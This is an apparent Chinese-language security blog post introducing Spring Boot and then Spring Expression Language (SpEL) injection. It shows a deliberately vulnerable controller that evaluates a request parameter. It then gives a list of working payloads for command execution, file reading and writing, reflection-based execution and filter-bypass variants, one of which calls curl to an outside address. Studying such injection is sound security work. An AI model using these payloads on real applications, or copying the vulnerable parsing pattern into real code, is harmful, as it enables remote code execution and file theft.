---
layout:     post
title:      Java-Spel 注入
subtitle:   Spring表达式语言（简称SpEl）是一个支持查询和操作运行时对象导航图功能的强大的表达式语言. 它的语法类似于传统EL，但提供额外的功能，最出色的就是函数调用和简单字符串的模板函数。
date:       2020-05-16
author:     BY Diego
header-img: img/wenzhang/post-bg-java-spel.jpg
catalog: true
tags:
    - Java
    - 命令注入
---

# 一、 Stringboot 框架

![](https://bkimg.cdn.bcebos.com/pic/37d12f2eb9389b503a80d4b38b35e5dde6116ed7?x-bce-process=image/watermark,g_7,image_d2F0ZXIvYmFpa2UxNTA=,xp_5,yp_5)

Spring框架是Java平台上的一种开源应用框架，提供具有控制反转特性的容器。

## ①目录结构
![Y6ESOA.png](https://s1.ax1x.com/2020/05/16/Y6ESOA.png)

主程序入口 /src/main/java/com.\*/\*Application

根目录:src/main/resources
*  1.配置文件(.properties/.json等)置于config文件夹下
*　2.页面以及js/css/image等置于static文件夹下的各自文件下

SpringBoot项目大概分为四层：
* （1）DAO层：包括XxxMapper.java(数据库访问接口类)，XxxMapper.xml(数据库链接实现)；（一般用Mapper，看个人习惯了吧）

*  （2）Bean层：也叫model层，模型层，entity层，实体层，就是数据库表的映射实体类，存放POJO对象；

*  （3）Service层：也叫服务层，业务层，包括XxxService.java(业务接口类)，XxxServiceImpl.java（业务实现类）；

* （4）Web层：就是Controller层，实现与web前端的交互。

具体可考 https://blog.csdn.net/weixin_39593985/article/details/88851320

## ② Stringboot中注释器

* **@SpringBootApplication**：包含了@ComponentScan、@Configuration和

* **@EnableAutoConfiguration** 注解。其中@ComponentScan让spring Boot扫描到Configuration类并把它加入到程序上下文。

* **@Configuration** 等同于spring的XML配置文件；使用Java代码可以检查类型安全。

* **@EnableAutoConfiguration** 自动配置。@ComponentScan组件扫描，可自动发现和装配一些Bean。

* **@Component** 可配合CommandLineRunner使用，在程序启动后执行一些基础任务。

* **@RestController** 注解是@Controller和@ResponseBody的合集,表示这是个控制器bean,并且是将函数的返回值直 接填入HTTP响应体中,是REST风格的控制器。

* **@Autowired** 自动导入。@PathVariable获取参数。

* **@ResponseBody**：表示该方法的返回结果直接写入HTTP response body中，一般在异步获取数据时使用，用于构建RESTful的api。
*  **@Controller**：用于定义控制器类，在spring 项目中由控制器负责将用户发来的URL请求转发到对应的服务接口（service层），一般这个注解在类中，通常方法需要配合注解@RequestMapping。
* **@RestController**：用于标注控制层组件(如struts中的action)，@ResponseBody和@Controller的合集。

具体可考 https://zhuanlan.zhihu.com/p/88177443


# 二、 Spel 注入

## ① 基本用法

```
引用其他对象:#{car}
引用其他对象的属性：#{car.brand}
调用其它方法 , 还可以链式操作：#{car.toString()}
属性名称引用还可以用$符号 如：${someProperty}
使用T()运算符会调用类作用域的方法和常量。#{T(java.lang.Math)}

```

一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。
```java
    //@Value能修饰成员变量和方法形参
    //#{}内就是表达式的内容
    @Value("#{表达式}")
    public String arg;
```
\<bean>配置
```xml
<bean id="xxx" class="com.java.XXXXX.xx">
    <!-- 同@Value,#{}内是表达式的值，可放在property或constructor-arg内 -->
    <property name="arg" value="#{表达式}">
</bean>
```
Expression
```java
@RequestMapping("/spel")
    public String TestSpel(HttpServletRequest request,HttpServletResponse response) throws IOException {

        String a = request.getParameter("a");
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(a);
        return expression.getValue().toString();
    }
```

## ② 注入

示例代码
```java
@RequestMapping("/spel")
    public String TestSpel(HttpServletRequest request,HttpServletResponse response) throws IOException {

        String a = request.getParameter("a");
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(a);
        return expression.getValue().toString();
    }
```
![Y6GMJH.png](https://s1.ax1x.com/2020/05/16/Y6GMJH.png)
### (1)常规注入

**执行命令**
```java
new java.lang.ProcessBuilder("calc").start()
```
![Y6GQWd.png](https://s1.ax1x.com/2020/05/16/Y6GQWd.png)
```java
T(java.lang.Runtime).getRuntime().exec("calc")
```
![Y6GKFe.png](https://s1.ax1x.com/2020/05/16/Y6GKFe.png)

**读文件** 仅第一行
```java
new java.util.Scanner(new java.io.File("filepath")).next()
```
![Y6JlAU.png](https://s1.ax1x.com/2020/05/16/Y6JlAU.png)
```java
new java.io.BufferedReader(new java.io.FileReader(new java.io.File("filepath"))).readLine()
```
![Y6JM7T.png](https://s1.ax1x.com/2020/05/16/Y6JM7T.png)


**写文件**
```java
new java.io.FileOutputStream(new java.io.File("filepath")).write("Diego".getBytes())
```
![Y6J7gs.png](https://s1.ax1x.com/2020/05/16/Y6J7gs.png)
虽然报错了，但是文件正常写入

### (2)利用java 反射机制

在反射⾥极为重要的⽅法：
* **获取类的⽅法： forName**
* **实例化类对象的⽅法： newInstance**
* **获取函数的⽅法： getMethod**
* **执⾏函数的⽅法： invoke**

java 获取class 的方式
* **第一种：通过类名获得**
　　**Class<?> class = ClassName.class;**
![Y6tRk8.png](https://s1.ax1x.com/2020/05/16/Y6tRk8.png)

* **第二种：通过类名全路径获得：**
　　**Class<?> class = Class.forName("类名全路径");**
![Y6tWtS.png](https://s1.ax1x.com/2020/05/16/Y6tWtS.png)

* **第三种：通过实例对象获得：**
　　**Class<?> class = object.getClass()**
![Y6tgTf.png](https://s1.ax1x.com/2020/05/16/Y6tgTf.png)

**命令执行**

利用runtime
```java
T(java.lang.Runtime).getMethod("exec","".class).invoke(T(java.lang.Runtime).getMethod("getRuntime").invoke(T(java.lang.Runtime)),"calc.exe")
```
![Y6wOSS.png](https://s1.ax1x.com/2020/05/16/Y6wOSS.png)

利用eval
```java
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder('calc').start();")
```
![Y6wbJf.png](https://s1.ax1x.com/2020/05/16/Y6wbJf.png)

引号被过滤
```java
new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()
```
![Y6rXhq.png](https://s1.ax1x.com/2020/05/16/Y6rXhq.png)

T( 被过滤
```java
1.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(1.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(1.class.forName("java.lang.Runtime")),"calc.exe")
```

.class.被过滤
```java
1['class'].forName("java.lang.Runtime").getMethod("exec","".class).invoke(1['class'].forName("java.lang.Runtime").getMethod("getRuntime").invoke(1['class'].forName("java.lang.Runtime")),"calc.exe")
```
![Y6wqW8.png](https://s1.ax1x.com/2020/05/16/Y6wqW8.png)

黑名单过滤.getClass、.class.、.addRole、.getPassword、.removeRole、session\['class']
利用数组方式绕过
```java
''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'curl 172.17.0.1:9898')
```

**读文件**
整个文件
```java
1.class.forName("java.nio.file.Files").readAllLines(1.class.forName("java.nio.file.Paths").get("G:\\2.txt"))
```
![Y60dtP.png](https://s1.ax1x.com/2020/05/16/Y60dtP.png)

常规注入里基本都可转化为反射注入，这里不在列举
把常见的命令执行和文件读取转化为一句话即可




# 三、 参考

[SpEL表达式总结](https://www.jianshu.com/p/e0b50053b5d3)

[使用IDEA搭建一个简单的SpringBoot项目——详细过程](https://blog.csdn.net/baidu_39298625/article/details/98102453)

[知识星球](https://govuln.com/)

[JAVA表达式注入漏洞](https://www.jianshu.com/p/e3c77c053359)
